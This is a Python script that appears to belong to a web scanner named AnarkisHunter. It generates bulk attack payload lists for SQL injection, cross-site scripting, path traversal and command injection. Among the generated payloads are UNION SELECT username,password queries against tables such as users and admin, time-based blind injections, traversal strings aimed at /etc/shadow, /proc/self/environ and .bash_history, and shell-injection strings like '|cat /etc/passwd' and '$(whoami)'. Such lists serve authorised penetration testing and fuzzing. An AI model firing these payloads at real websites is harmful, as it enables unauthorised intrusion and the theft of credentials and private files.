"""Generate expanded payload files for AnarkisHunter."""
from pathlib import Path

PAYLOADS = Path(__file__).resolve().parents[1] / "payloads"


def load_existing(name: str) -> list:
    p = PAYLOADS / name
    if p.exists():
        return [l.strip() for l in p.read_text(encoding="utf-8").splitlines() if l.strip()]
    return []


def save(name: str, items: list):
    unique = list(dict.fromkeys(items))
    (PAYLOADS / name).write_text("\n".join(unique), encoding="utf-8")
    print(f"{name}: {len(unique)} payloads")


def gen_sqli() -> list:
    base = load_existing("sqli.txt")
    extra = []
    for i in range(1, 51):
        extra += [f"1' OR {i}={i}--", f"' OR {i}={i}#", f"1 AND {i}={i}"]
    for i in range(1, 21):
        extra += [f"' UNION SELECT {i},{i+1},{i+2}--", f"' UNION ALL SELECT {i},NULL,NULL--"]
    for i in range(1, 11):
        extra += [
            f"1' AND SLEEP({i})--", f"'; SELECT pg_sleep({i})--",
            f"1'; WAITFOR DELAY '0:0:{i}'--",
        ]
    for tbl in ["users", "admin", "accounts", "customers", "members"]:
        extra += [f"' UNION SELECT * FROM {tbl}--", f"' UNION SELECT username,password FROM {tbl}--"]
    for fn in ["EXTRACTVALUE", "UPDATEXML", "CONVERT", "CAST"]:
        extra += [f"' AND {fn}(1,1)--", f"1' AND {fn}(1,CONCAT(0x7e,version()))--"]
    return base + extra


def gen_xss() -> list:
    base = load_existing("xss.txt")
    markers = ["alert(1)", "alert(document.domain)", "prompt(1)", "confirm(1)"]
    tags = ["script", "img", "svg", "iframe", "body", "video", "audio", "details", "marquee"]
    events = ["onerror", "onload", "onclick", "onmouseover", "onfocus", "onblur", "oninput"]
    extra = []
    for m in markers:
        extra += [f"<script>{m}</script>", f"<ScRiPt>{m}</ScRiPt>"]
        for t in tags:
            for e in events:
                extra.append(f"<{t} {e}={m}>")
        extra += [
            f'"><script>{m}</script>',
            f"'><script>{m}</script>",
            f'"><img src=x onerror={m}>',
            f"javascript:{m}",
            f"<svg/onload={m}>",
            f"<iframe src=javascript:{m}>",
        ]
    for enc in ["%3Cscript%3E", "&#60;script&#62;", "\\u003cscript\\u003e"]:
        extra.append(f"{enc}alert(1){enc.replace('3C','3E').replace('60;','62;')}")
    return base + extra


def gen_lfi() -> list:
    base = load_existing("lfi.txt")
    linux = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group",
        "/proc/self/environ", "/proc/self/cmdline", "/proc/version",
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
        "/var/www/html/index.php", "/home/user/.bash_history",
    ]
    windows = [
        "..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\windows\\win.ini", "C:\\boot.ini", "C:\\windows\\system.ini",
    ]
    extra = []
    for p in linux + windows:
        for prefix in ["", "../", "../../", "../../../", "....//....//", "..%2f", "..%252f"]:
            extra.append(prefix + p.lstrip("/"))
    wrappers = ["php://filter/convert.base64-encode/resource=", "php://input", "data://text/plain,"]
    for w in wrappers:
        extra.append(w + "index.php")
    return base + extra


def gen_cmd() -> list:
    base = load_existing("cmd.txt")
    linux = [";id", "|id", "||id", "&id", "&&id", ";whoami", "|whoami", ";uname -a", "|cat /etc/passwd"]
    windows = ["&whoami", "|whoami", "||whoami", "&dir", "|dir", ";dir", "`whoami`", "$(whoami)"]
    extra = []
    for c in linux + windows:
        for prefix in ["", " ", "%0a", "%0d", "%00"]:
            extra.append(prefix + c)
    for c in ["id", "whoami", "ls", "pwd", "dir", "type"]:
        extra += [f";{c}", f"|{c}", f"||{c}", f"&{c}", f"`{c}`", f"$({c})"]
    return base + extra


if __name__ == "__main__":
    PAYLOADS.mkdir(exist_ok=True)
    save("sqli.txt", gen_sqli())
    save("xss.txt", gen_xss())
    save("lfi.txt", gen_lfi())
    save("cmd.txt", gen_cmd())
